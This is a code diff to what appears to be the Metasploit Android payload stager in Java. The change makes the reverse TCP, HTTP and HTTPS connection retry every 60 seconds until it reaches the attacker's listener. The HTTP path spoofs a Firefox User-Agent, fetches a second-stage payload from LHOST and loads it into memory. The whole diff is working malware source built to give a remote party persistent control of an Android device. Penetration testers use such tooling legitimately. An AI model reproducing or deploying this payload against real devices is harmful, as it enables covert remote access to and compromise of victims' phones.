@@ -26,16 +26,29 @@ public class Payload {
 
     public static void main(String[] args) {
     	
-    	String lprotocol = LHOST.substring(4).trim().split(":")[1];
-    	
-    	if (lprotocol.equals("T")) {
-    		reverseTCP();
+    	while(!startReverseConn(LHOST.substring(4).trim().split(":")[1])) {
+			try {
+				Thread.sleep(60000);
+			} catch (InterruptedException e) {
+				//e.printStackTrace();
+			}
     	}
-    	else if (lprotocol.equals("H")) {
-    		reverseHTTP(false);
-    	}
-    	else if (lprotocol.equals("HS")) {
-    		reverseHTTP(true);
+    }
+    
+    private static boolean startReverseConn(String lprotocol) {
+    	try {
+	    	if (lprotocol.equals("T")) {
+	    		reverseTCP();
+	    	}
+	    	else if (lprotocol.equals("H")) {
+	    		reverseHTTP(false);
+	    	}
+	    	else if (lprotocol.equals("HS")) {
+	    		reverseHTTP(true);
+	    	}
+	    	return true;
+    	} catch (Exception e) {
+    		return false;
     	}
     }
     
@@ -58,45 +71,41 @@ public class Payload {
     
     static int URI_CHECKSUM_INITJ = 88;
     
-    private static void reverseHTTP(boolean ssl) {
+    private static void reverseHTTP(boolean ssl) throws Exception {
     	int checksum = 0;
     	String URI;
     	HttpURLConnection urlConn;
+
+        String lhost = LHOST.substring(4).trim().split(":")[0];
+        String lport = LPORT.substring(4).trim();
+        
+        while(true) {
+        	URI = randomString(4);		
+        	checksum = checksumText(URI);	
+        	if(checksum == URI_CHECKSUM_INITJ) break;
+    	}
+      
+        String FullURI = "/" + URI.toString();
+        
+        String urlStart = ssl ? "https://" : "http://";
+        
+		URL url = new URL(urlStart + lhost + ":" + lport + FullURI + "_" + randomString(16));	 
     	
-    	try { 	
-            String lhost = LHOST.substring(4).trim().split(":")[0];
-            String lport = LPORT.substring(4).trim();
-            
-            while(true) {
-            	URI = randomString(4);		
-            	checksum = checksumText(URI);	
-            	if(checksum == URI_CHECKSUM_INITJ) break;
-        	}
-          
-            String FullURI = "/" + URI.toString();
-            
-            String urlStart = ssl ? "https://" : "http://";
-            
-    		URL url = new URL(urlStart + lhost + ":" + lport + FullURI + "_" + randomString(16));	 
-	    	
-	    	if (ssl) { 
-	    		urlConn = (HttpsURLConnection) url.openConnection();
-	    		Class.forName("com.metasploit.android.stage.PayloadTrustManager")
-	    		.getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {urlConn});
-	    	}
-	    	else urlConn = (HttpURLConnection) url.openConnection();
-	    	
-	        urlConn.setDoInput (true);
-	        urlConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0");
-	        urlConn.setRequestMethod("GET");
-	        urlConn.connect();
-	        DataInputStream in = new DataInputStream(urlConn.getInputStream());
-	        
-	        loadStage(in, null, context, new String[] {});	        
-	        urlConn.disconnect();    	
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+    	if (ssl) { 
+    		urlConn = (HttpsURLConnection) url.openConnection();
+    		Class.forName("com.metasploit.android.stage.PayloadTrustManager")
+    		.getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {urlConn});
+    	}
+    	else urlConn = (HttpURLConnection) url.openConnection();
+    	
+        urlConn.setDoInput (true);
+        urlConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0");
+        urlConn.setRequestMethod("GET");
+        urlConn.connect();
+        DataInputStream in = new DataInputStream(urlConn.getInputStream());
+        
+        loadStage(in, null, context, new String[] {});	        
+        urlConn.disconnect();    	
     }
     
     private static void loadStage(DataInputStream in, OutputStream out, Context context, String[] parameters) throws Exception {
